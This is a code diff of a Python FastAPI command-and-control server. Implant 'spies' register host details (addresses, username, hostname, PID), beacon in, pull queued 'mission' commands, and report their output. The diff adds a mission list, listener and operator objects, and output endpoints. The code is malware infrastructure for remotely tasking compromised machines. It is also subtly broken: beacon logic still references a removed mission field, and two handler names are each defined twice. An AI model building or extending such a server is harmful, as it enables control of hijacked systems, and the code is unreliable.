@@ -6,6 +6,8 @@ import string
 from datetime import datetime
 import base64
 
+
+# Class for requests
 class RegisterRequest(BaseModel):
     intaddr: str
     extaddr: str
@@ -21,17 +23,20 @@ class BeaconRequest(BaseModel):
 class MissionRequest(BaseModel):
     command: str
 
-class ResultRequest(BaseModel):
-    command: str
-    result: str
+class MissionUpdateRequest(BaseModel):
+    output: str
     
 
 
 
+# Class for server objects
+class Server:
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
 
 class Spy:
     newId = itertools.count(start=1)
-
     def __init__(self):
         self.id = next(self.newId)
         self.guid = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
@@ -42,10 +47,9 @@ class Spy:
         self.hostname = None
         self.ops = None
         self.pid = None
-        self.mission = None
         self.firstcheckin = None
         self.lastcheckin = None
-        self.output = ""
+        self.missionlist = []
 
     def initial_checkin(self, intaddr, extaddr, username, hostname, ops, pid):
         self.active = True
@@ -64,7 +68,38 @@ class Spy:
         if self.mission is not None and self.mission == 'kill':
             self.active = False
 
+class Listener:
+    def __init__(self, type, name, bindport):
+        self.type=type
+        self.name=name
+        self.bindport=bindport
+
+class Operator:
+    def __init__(self, name, role):
+        self.name = name
+        self.role = role
+
+class Mission:
+    newId = itertools.count(start=1)
+    def __init__(self, spyid, command):
+        self.id = next(self.newId)
+        self.spyid = spyid
+        self.command = command
+        self.iscompleted = False
+        self.output = ""
+        self.isviewed = False
+
+    def update_mission(self,iscompleted, output, isviewed):
+        self.iscompleted = iscompleted
+        self.output = output
+        self.isviewed = isviewed
+
+
+
 spies = []
+operator = []
+listener = []
+
 app = FastAPI()
 
 @app.post("/register")
@@ -92,45 +127,52 @@ async def beacon(request: BeaconRequest):
 async def list_spies():
     return [spy.__dict__ for spy in spies]
 
-@app.get("/spy/{spy_id}")
-async def get_spy(spy_id: int):
-    spy = next((s for s in spies if s.id == spy_id), None)
-    if spy:
-        return spy.__dict__
-    raise HTTPException(status_code=404, detail="Spy not found")
-
-@app.get("/cls/{spy_id}")
-async def clean_output(spy_id: int):
-    spy = next((s for s in spies if s.id == spy_id), None)
-    if spy:
-        spy.output = ""
-        return {"message": "Output cleared"}
-    raise HTTPException(status_code=404, detail="Spy not found")
 
 @app.post("/mission/{spy_id}")
 async def receive_mission(spy_id: int, request: MissionRequest):
     spy = next((s for s in spies if s.id == spy_id), None)
     if spy:
-        if spy.mission is not None:
-            return {"message": "The mission queue is full, please wait for the execution of current mission"}
-        spy.mission = request.command
-        return {"message": f"Mission updated for spy {spy.guid}"}
+        m = Mission(spy_id, request.command)
+        spy.missionlist.insert(0,m)        
+        return m.__dict__
     raise HTTPException(status_code=404, detail="Spy not found")
 
 
-@app.post("/result/{spy_id}")
-async def get_result(spy_id: int, request: ResultRequest):
+@app.get("/spy/{spy_id}")
+async def receive_mission(spy_id: int):
     spy = next((s for s in spies if s.id == spy_id), None)
     if spy:
-        result = request.result
-        result_bytes = result.encode("ascii") 
-        string_bytes = base64.b64decode(result_bytes)
-        raw = string_bytes.decode("ascii")
-        output = f"Command: {request.command}\nResult: {raw}"
-        spy.output = output
-        print(output)
-        return {"message": "Result received"}
+        spy.lastcheckin = datetime.now()
+        return spy.__dict__
     raise HTTPException(status_code=404, detail="Spy not found")
+
+
+@app.post("/spy/{spy_id}/{mission_id}/output")
+async def update_output(spy_id: int, mission_id: int, request: MissionUpdateRequest):
+    spy = next((s for s in spies if s.id == spy_id), None)
+    if spy:
+        mission = next((m for m in spy.missionlist if m.id == mission_id), None)
+        if mission:
+            mission.output = request.output
+            mission.iscompleted = True
+            return {"message": "Updated output successfully"}
+    raise HTTPException(status_code=404, detail="Spy not found")
+
+
+@app.get("/spy/{spy_id}/{mission_id}/output")
+async def update_output(spy_id: int, mission_id: int):
+    spy = next((s for s in spies if s.id == spy_id), None)
+    if spy:
+        mission = next((m for m in spy.missionlist if m.id == mission_id), None)
+        if mission:
+            mission.isviewed = True
+            return {"output": mission.output}
+    raise HTTPException(status_code=404, detail="Spy not found")
+
+
+
+
+
 
 if __name__ == "__main__":
     import uvicorn
